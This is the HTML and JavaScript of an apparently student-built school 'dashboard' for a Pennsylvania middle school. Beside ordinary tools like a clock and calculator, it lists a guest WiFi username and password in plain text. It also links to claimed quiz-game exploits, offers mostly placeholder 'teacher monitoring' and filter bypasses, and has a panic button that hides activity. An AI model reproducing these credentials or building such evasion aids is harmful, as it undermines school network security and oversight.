                    <input type="checkbox" id="privacyMode">
                    <span class="custom-toggle-slider"></span>
                </label>
            </div>
        </div>
      </div>

      <!-- WiFi Panel -->
      <div id="wifiPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>üì° School WiFi Information</h2>
        <div class="wifi-grid">
          <div>Network Name</div>
          <div>Wifi Level</div>
          <div>Security Type</div>
          <div>Encryption</div>
          <div>Hidden?</div>
          <div>Monitored?</div>
          <div>Username</div>
          <div>Password</div>
        </div>
        
        <div class="wifi-entry">
          <div>Middletown_Core</div>
          <div data-level="High">High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>No</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown_Core</div>
          <div data-level="High">High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown Guest</div>
          <div data-level="Medium">Medium</div>
          <div>WPA3 Enterprise</div>
          <div>Medium</div>
          <div>No</div>
          <div>Rare</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
        
        <div class="wifi-entry">
          <div>Radius Test</div>
          <div data-level="Low">Low</div>
          <div>WPA3 Enterprise</div>
          <div>Low</div>
          <div>No</div>
          <div>Rarely</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
      </div>

      <!-- iPad Panel -->
      <div id="ipadPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>üì± School iPad Restrictions</h2>
        <div class="ipad-options">
          <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
          <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
        </div>
        
        <div id="ipadRestrictions" class="ipad-content">
          <p>Coming soon</p>
        </div>
        
        <div id="ipadBypasses" class="ipad-content">
          <p>Coming soon</p>
        </div>
      </div>

      <!-- Handbook Panel -->
      <div id="handbookPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>üìò Student Handbooks Information</h2>
        <div class="handbook-buttons">
          <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank">Elementary Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank">Secondary Student Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank">District Handbook</a>
          <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank">RA Academy Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank">Virtual Learning Plan (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Dress Code (2024-2025)</a>
        </div>
      </div>

      <!-- Map Panel -->
      <div id="mapPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>üè´ School Building Map Information</h2>
        <p>Building Map Display</p>
        <div class="coming-soon">
          Building Map Coming Soon
        </div>
      </div>

      <!-- Student Websites Panel -->
      <div id="studentWebsitesPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>üåê Student Website's Information</h2>
        <div class="links-list">
          <a href="https://www.raiderweb.org" target="_blank">RaiderWeb</a>
          <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Login</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Login</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a>
          <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://www.safe2saypa.org" target="_blank">Safe2Say</a>
          <a href="https://mail.google.com/mail/" target="_blank">Gmail</a>
          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt!</a>
        </div>
      </div>

      <!-- Teacher Websites Panel -->
      <div id="teacherWebsitesPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>üë©‚Äçüè´ Teacher Websites Information</h2>
        <div class="links-list">
          <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a>
          <a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a>
          <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda</a>
          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Buy Guernsey</a>
          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher)</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher)</a>
          <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
          <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a>
          <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher)</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a>
          <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS</a>
          <a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
          <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox</a>
          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a>
          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365</a>
        </div>
      </div>

      <!-- Phone Directory Panel -->
      <div id="phoneDirectoryPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>üìû School Phone Directory Information</h2>
        <div class="coming-soon">
          Update Coming Soon!
        </div>
      </div>

      <!-- Camera Panel -->
      <div id="cameraPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>üì∑ School Camera Information</h2>
        <div class="coming-soon">
          Update Coming Soon
        </div>
      </div>

      <!-- School Info Panel -->
      <div id="schoolInfoPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>üè´ School Information</h2>
        <div class="school-info-grid">
          <div class="school-info-item">
            <div class="school-info-label">School Name:</div>
            <div>Middletown Area Middle School</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Address:</div>
            <div>215 Oberlin Road Middletown, PA 17057</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Fax:</div>
            <div>717-944-0591</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Principal:</div>
            <div>Dr. Shannon L. Wevodau</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Email:</div>
            <div>swevodau@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal:</div>
            <div>Mr. Michael DeFilippo</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Email:</div>
            <div>mdefilippo@raiderweb.org</div>
          </div>
        </div>
      </div>

      <!-- Exploit Panel -->
      <div id="exploitPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>üß® Exploiting Tools</h2>
        <div class="exploit-buttons">
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Kahoot Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Gimkit Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizlet Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizzes Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quills Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Edpuzzle Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Nearpod Exploit</a>
        </div>
      </div>

      <!-- Bypass Panel -->
      <div id="bypassPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>üö™ Bypassing Tools</h2>
        <div class="bypass-buttons">
          <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
          <button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
          <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
          <button onclick="dashboard.showBypassContent('coming1')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming2')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming3')">Coming Soon</button>
        </div>
        
        <div id="bathroomBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="wifiBypass" class="bypass-content">
          <p>Go to School Wifi Information</p>
        </div>
        
        <div id="monitoringBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming1Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming2Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming3Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
      </div>

      <!-- VPN Panel -->
      <div id="vpnPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>üîê VPN Websites</h2>
        <div class="links-list">
          <a href="https://example-vpn1.com" target="_blank">VPN Service 1</a>
          <a href="https://example-vpn2.com" target="_blank">VPN Service 2</a>
          <a href="https://example-vpn3.com" target="_blank">VPN Service 3</a>
          <a href="https://example-vpn4.com" target="_blank">VPN Service 4</a>
        </div>
      </div>

      <!-- Gaming Panel -->
      <div id="gamingPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>üéÆ Gaming Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Music Panel -->
      <div id="musicPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>üéµ Music Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Keyboard Panel -->
      <div id="keyboardPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>üéπ Keyboard Tricks</h2>
        <div class="info-text">
          <p>System Shortcuts:
‚Ä¢ Access Spotlight Search: Press Command (‚åò) + Space bar.
‚Ä¢ Return to the Home screen: Press Command (‚åò) + H.
‚Ä¢ Show the Dock: Press Command (‚åò) + Option (‚å•) + D.
‚Ä¢ Show the App Library: Press Shift (‚áß) + Globe + A.
‚Ä¢ Open Quick Note: Press Globe + Q.
‚Ä¢ Open Siri: Press Globe + S.
‚Ä¢ Open Control Center: Press Globe + C.
‚Ä¢ Open Notification Center: Press Globe + N.
‚Ä¢ Show all windows: Press Globe + Down Arrow.
‚Ä¢ Open the App Switcher: Press and hold Command (‚åò) + Tab.
‚Ä¢ Open Split View: Press Control (‚åÉ) + Globe + Left Arrow to move an app to the left, or Control (‚åÉ) + Globe + Right Arrow to move it to the right.
‚Ä¢ Switch the position of apps in Split View: Press Control (‚åÉ) + Globe + Left or Right Arrow.
‚Ä¢ Open Slide Over: Press Globe + Backslash.
‚Ä¢ Move the Slide Over window: Press Option (‚å•) + Globe + Left or Right Arrow.
Safari and App-Specific Shortcuts:
‚Ä¢ Take a full-screen screenshot: Press Command (‚åò) + Shift + 3.
‚Ä¢ Take a screenshot and enter markup immediately: Press Command (‚åò) + Shift + 4.
‚Ä¢ Open a new private tab: Press Command (‚åò) + Shift + N.
‚Ä¢ Open a new tab: Press Command (‚åò) + T or Command (‚åò) + N.
‚Ä¢ Close the current tab: Press Command (‚åò) + W.
‚Ä¢ Close all tabs in Tab Grid: Press Shift + Command (‚åò) + W.
‚Ä¢ Go to the next tab: Press Option (‚å•) + Command (‚åò) + Right Arrow, or Control (‚åÉ) + Tab, or Command (‚åò) + }.
‚Ä¢ Go to the previous tab: Press Option (‚å•) + Command (‚åò) + Left Arrow, or Shift + Control (‚åÉ) + Tab, or Command (‚åò) + {.
‚Ä¢ Reopen the last closed tab: Press Shift + Command (‚åò) + T.
‚Ä¢ Go to a specific tab (1-8): Press Command (‚åò) + (1-8).
‚Ä¢ Go to the last tab: Press Command (‚åò) + 9.
‚Ä¢ Open the Tab Grid: Press Shift + Command (‚åò) + .
‚Ä¢ Open a new Incognito tab: Press Shift + Command (‚åò) + N.
‚Ä¢ Open a new Incognito window: Press Option (‚å•) + Shift + Command (‚åò) + N.
‚Ä¢ Open a new window: Press Option (‚å•) + Command (‚åò) + N.
General Navigation and Text Editing:
‚Ä¢ Navigate between elements in an app (like fields, lists, buttons): Press Tab.
‚Ä¢ Select all text: Press Command (‚åò) + A.
‚Ä¢ Copy selected text: Press Command (‚åò) + C.
‚Ä¢ Cut selected text: Press Command (‚åò) + X.
‚Ä¢ Paste copied text: Press Command (‚åò) + V.
‚Ä¢ Undo the last action: Press Command (‚åò) + Z.
‚Ä¢ Redo the last undone action: Press Command (‚åò) + Shift + Z.
‚Ä¢ Jump to the top of a page: Press Command (‚åò) + Up Arrow.
‚Ä¢ Jump to the bottom of a page: Press Command (‚åò) + Down Arrow.
‚Ä¢ Highlight text one character at a time: Press Shift + Left or Right Arrow.
To view all available shortcuts for the specific app you are using, press and hold the Command (‚åò) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
        </div>
      </div>

      <!-- New Panels -->
      <div id="keybindsPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>‚å®Ô∏è Configure Keybinds</h2>
        <div class="keybinds-grid" id="keybindsGrid">
            <!-- Keybind items loaded here by JS -->
        </div>
        <div class="text-xs text-muted-foreground mt-4">Click a keybind input to record a new key.</div>
      </div>

      <div id="timerStopwatchPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>‚è±Ô∏è Timer & Stopwatch</h2>
        <div class="flex flex-col items-center gap-4 mt-4">
            <div class="text-3xl font-mono" id="timerDisplay">00:00:00</div>
            <div class="flex gap-2">
                <button class="dashboard-grid-button" id="startStopwatchBtn">Start Stopwatch</button>
                <button class="dashboard-grid-button" id="stopStopwatchBtn">Stop Stopwatch</button>
                <button class="dashboard-grid-button" id="resetStopwatchBtn">Reset Stopwatch</button>
            </div>
            <hr class="w-full my-4 border-gray-700">
            <input type="number" id="countdownInput" placeholder="Set seconds for timer" class="text-input p-2 rounded-lg" min="1" value="60">
            <div class="text-3xl font-mono" id="countdownDisplay">00:00:00</div>
            <div class="flex gap-2">
                <button class="dashboard-grid-button" id="startTimerBtn">Start Timer</button>
                <button class="dashboard-grid-button" id="stopTimerBtn">Stop Timer</button>
                <button class="dashboard-grid-button" id="resetTimerBtn">Reset Timer</button>
            </div>
        </div>
      </div>

      <div id="activityLogsPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>üìú Activity Logs</h2>
        <textarea readonly id="activityLogContent" class="mt-3"></textarea>
      </div>

      <div id="loginHistoryPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>üë§ Login History</h2>
        <textarea readonly id="loginHistoryContent" class="mt-3"></textarea>
      </div>

      <div id="calculatorPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>üßÆ Calculator</h2>
        <input type="text" id="calcDisplay" value="0" readonly>
        <div class="calc-grid">
            <button>C</button>
            <button>+/-</button>
            <button>%</button>
            <button>/</button>
            <button>7</button>
            <button>8</button>
            <button>9</button>
            <button>*</button>
            <button>4</button>
            <button>5</button>
            <button>6</button>
            <button>-</button>
            <button>1</button>
            <button>2</button>
            <button>3</button>
            <button>+</button>
            <button class="col-span-2">0</button>
            <button>.</button>
            <button>=</button>
        </div>
      </div>

      <div id="unitConverterPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>üîÑ Unit Converter</h2>
        <div class="flex flex-col gap-3 mt-4">
            <div class="flex items-center gap-2">
                <input type="number" id="convertInput" class="text-input p-2 rounded-lg flex-grow" value="1">
                <select id="convertFrom" class="text-input p-2 rounded-lg">
                    <option value="meters">Meters</option>
                    <option value="feet">Feet</option>
                    <option value="cm">CM</option>
                </select>
            </div>
            <div class="text-center">to</div>
            <div class="flex items-center gap-2">
                <input type="text" id="convertOutput" class="text-input p-2 rounded-lg flex-grow" readonly>
                <select id="convertTo" class="text-input p-2 rounded-lg">
                    <option value="feet">Feet</option>
                    <option value="meters">Meters</option>
                    <option value="cm">CM</option>
                </select>
            </div>
            <button class="dashboard-grid-button mt-3" onclick="dashboard.convertUnit()">Convert</button>
        </div>
      </div>

      <div id="statsPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>üìä User Stats</h2>
        <div id="statsContent" class="mt-3 space-y-2">
            <p><strong>Buttons Pressed:</strong> <span id="statButtonsPressed">0</span></p>
            <p><strong>Toggles Used:</strong> <span id="statTogglesUsed">0</span></p>
            <p><strong>Panels Opened:</strong> <span id="statPanelsOpened">0</span></p>
            <p><strong>Panels Closed:</strong> <span id="statPanelsClosed">0</span></p>
            <p><strong>Canvas Draws:</strong> <span id="statCanvasDraws">0</span></p>
            <p><strong>Theme Changes:</strong> <span id="statThemeChanges">0</span></p>
        </div>
      </div>

      <div id="mediaPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>‚ñ∂Ô∏è Media</h2>
        <div class="flex flex-col gap-3 mt-4">
            <input type="text" id="youtubeUrlInput" placeholder="Enter YouTube URL or ID" class="text-input p-2 rounded-lg">
            <button class="dashboard-grid-button" id="loadYoutubeBtn">Load Video</button>
            <div id="youtubePlayer" class="mt-4">
                <iframe id="mediaFrame" width="100%" height="400" src="" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
            </div>
            <p class="text-sm text-muted-foreground mt-2">Note: To bypass school filters, you would need a separate proxy service. This embed may not work if YouTube is blocked directly.</p>
        </div>
      </div>

      <div id="reminderPanel" class="info-panel">
        <div class="drag-handle"></div>
        <h2>üîî Reminders</h2>
        <div class="flex flex-col gap-3 mt-4">
            <input type="text" id="reminderTextInput" placeholder="What to remind you about?" class="text-input p-2 rounded-lg">
            <input type="datetime-local" id="reminderTimeInput" class="text-input p-2 rounded-lg">
            <button class="dashboard-grid-button" id="setReminderBtn">Set Reminder</button>
            <div id="activeReminders" class="mt-4 space-y-2">
                <h3>Your Reminders:</h3>
                <!-- Reminders listed here -->
            </div>
        </div>
      </div>

    </div>

    <div id="canvasContainer">
      <h2>üñåÔ∏è Notes Canvas</h2>
      <canvas id="notesCanvas" width="800" height="500"></canvas>
      <div id="canvasControls">
        <button id="clearCanvasBtn">Clear Canvas</button>
        <button id="closeCanvasBtn">Close Notes</button>
        <input type="color" id="brushColor" value="#ff914d">
        <input type="range" id="brushThickness" min="1" max="20" value="2">
        <button id="addTextNoteBtn">Add Text Note</button>
        <button id="undoDrawBtn">Undo</button>
        <button id="redoDrawBtn">Redo</button>
        <button id="saveCanvasBtn">Save</button>
        <button id="loadCanvasBtn">Load</button>
      </div>
    </div>
  </div>

  <script>
    // Global activity log for tracking user actions
    const activityLog = [];
    let loginAttemptsLog = []; // Log for login attempts
    let loginHistory = []; // Stores successful login times

    function logActivity(action, category = 'General') {
        const timestamp = new Date().toLocaleString();
        const entry = `${timestamp} - ${category}: ${action}`;
        activityLog.push(entry);
        console.log(entry); // For debugging
        // Update stats
        if (category === 'Button Press') stats.buttonsPressed++;
        if (category === 'Toggle') stats.togglesUsed++;
        if (category === 'Panel') {
            if (action.includes('Opened')) stats.panelsOpened++;
            if (action.includes('Closed')) stats.panelsClosed++;
        }
        if (category === 'Canvas') {
            if (action.includes('drew')) stats.canvasDraws++;
        }
        if (category === 'Theme') stats.themeChanges++;

        dashboard.updateActivityLogs();
        dashboard.updateStats();
    }

    const stats = {
        buttonsPressed: 0,
        togglesUsed: 0,
        panelsOpened: 0,
        panelsClosed: 0,
        canvasDraws: 0,
        themeChanges: 0,
        init: function() {
            // Load from localStorage if available
            const savedStats = JSON.parse(localStorage.getItem('userStats') || '{}');
            Object.assign(this, savedStats);
        },
        save: function() {
            localStorage.setItem('userStats', JSON.stringify(this));
        }
    };

    // Dashboard functionality object
    const dashboard = {
      // Initialize all dashboard functionality
      init: function() {
        logActivity('Dashboard Initialized', 'System');
        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initThemeSystem(); // Use new theme system
        this.initButtons();
        this.initCanvas();
        this.initPanels();
        this.initPanelDragging(); // Initialize draggable panels
        this.initKeybinds();
        this.initTimerStopwatch();
        this.initCalculator();
        this.initUnitConverter();
        this.initMediaPlayer();
        this.initReminders();
        this.initDashboardSearch();
        this.applyWifiLevelColors();
        this.displayRandomFact();
        this.displayDailyQuote();
        stats.init(); // Initialize stats
        this.updateStats(); // Display initial stats
        this.showWelcomeNotification();
        this.loadLoginHistory(); // Load login history for the panel
      },
      
      // Initialize session timer
      initSessionTimer: function() {
        let sessionSeconds = 0;
        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }
        
        function updateSessionTime() {
          sessionSeconds++;
          document.getElementById('sessionTime').innerText = `‚è≥ Session Time: ${formatTime(sessionSeconds)}`;
        }
        
        updateSessionTime();
        setInterval(updateSessionTime, 1000);
        logActivity('Session timer started', 'Timer');
      },
      
      // Initialize real-time clock and 24-hour format
      is24HourFormat: localStorage.getItem('is24HourFormat') === 'true',
      initClock: function() {
        const toggle24HourFormat = document.getElementById('toggle24HourFormat');
        toggle24HourFormat.checked = this.is24HourFormat;

        const updateClock = () => {
          const now = new Date();
          const timeOptions = { hour: 'numeric', minute: 'numeric', second: 'numeric' };
          if (!this.is24HourFormat) {
            timeOptions.hour12 = true;
          } else {
            timeOptions.hour12 = false;
          }
          const timeStr = now.toLocaleTimeString(undefined, timeOptions);
          const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });

          document.getElementById('realTimeClock').innerText = 'üïí ' + timeStr;
          document.getElementById('realDate').innerText = 'üìÖ ' + dateStr;
          document.getElementById('displayTime').innerText = timeStr; // For login page
          document.getElementById('displayDate').innerText = dateStr; // For login page
        };
        
        toggle24HourFormat.addEventListener('change', (e) => {
            this.is24HourFormat = e.target.checked;
            localStorage.setItem('is24HourFormat', this.is24HourFormat);
            logActivity(`Toggled 24-hour format to ${this.is24HourFormat}`, 'Toggle');
            updateClock(); // Update immediately
        });

        updateClock();
        setInterval(updateClock, 1000);
        logActivity('Real-time clock started', 'Clock');
      },
      
      // Generate calendar
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        calendar.innerHTML = '';
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDay = new Date(year, month, 1).getDay();
        const lastDate = new Date(year, month + 1, 0).getDate();

        for (let i = 0; i < firstDay; i++) {
          const empty = document.createElement('div');
          calendar.appendChild(empty);
        }

        for (let i = 1; i <= lastDate; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) cell.classList.add('today');
          calendar.appendChild(cell);
        }
        logActivity('Calendar generated', 'UI');
      },

      // Theme Management System
      initThemeSystem: function() {
        const themeSelector = document.getElementById('themeSelector');
        const savedTheme = localStorage.getItem('theme') || 'dark-theme';
        document.documentElement.className = savedTheme; // Apply saved theme
        themeSelector.value = savedTheme;

        themeSelector.addEventListener('change', (e) => {
            const newTheme = e.target.value;
            document.documentElement.className = newTheme;
            localStorage.setItem('theme', newTheme);
            logActivity(`Changed theme to ${newTheme}`, 'Theme');
        });
        logActivity(`Theme system initialized with ${savedTheme} theme`, 'Theme');
      },
      
      // Initialize buttons
      initButtons: function() {
        document.getElementById('panicBtnMain').addEventListener('click', () => {
          window.open('https://clever.com', '_blank');
          logActivity('Clicked Panic button', 'Button Press');
        });

        document.getElementById('restartBtn').addEventListener('click', () => {
          if(confirm('Are you sure you want to kill the page (restart)?')) {
            document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:hsl(var(--bg-color)); color:hsl(var(--text-color)); font-family:'Segoe UI', sans-serif; font-size:24px;">Page has been killed. Restart to continue.</div>`;
            logActivity('Clicked Restart button - Page killed', 'Button Press');
          }
        });

        document.getElementById('fixIssuesBtn').addEventListener('click', () => {
          alert('Running diagnostics...\nNo issues found. Your dashboard is running smoothly!');
          logActivity('Clicked Fix Issues button', 'Button Press');
        });
        
        document.getElementById('fullScreenBtn').addEventListener('click', () => {
          if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(err => {
              alert(`Error attempting to enable full-screen mode: ${err.message}`);
            });
            logActivity('Enabled Full Screen mode', 'Button Press');
          } else {
            document.exitFullscreen();
            logActivity('Exited Full Screen mode', 'Button Press');
          }
        });
        
        let zoomLevel = 1;
        const zoomStep = 0.1;
        const minZoom = 0.5;
        const maxZoom = 2;

        document.getElementById('zoomInBtn').addEventListener('click', () => {
          if (zoomLevel < maxZoom) {
            zoomLevel += zoomStep;
            document.body.style.zoom = zoomLevel;
            logActivity(`Zoomed in to ${Math.round(zoomLevel * 100)}%`, 'Button Press');
          }
        });

        document.getElementById('zoomOutBtn').addEventListener('click', () => {
          if (zoomLevel > minZoom) {
            zoomLevel -= zoomStep;
            document.body.style.zoom = zoomLevel;
            logActivity(`Zoomed out to ${Math.round(zoomLevel * 100)}%`, 'Button Press');
          }
        });

        document.getElementById('downloadLogsBtn').addEventListener('click', () => {
            const logsText = activityLog.join('\n');
            const blob = new Blob([logsText], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
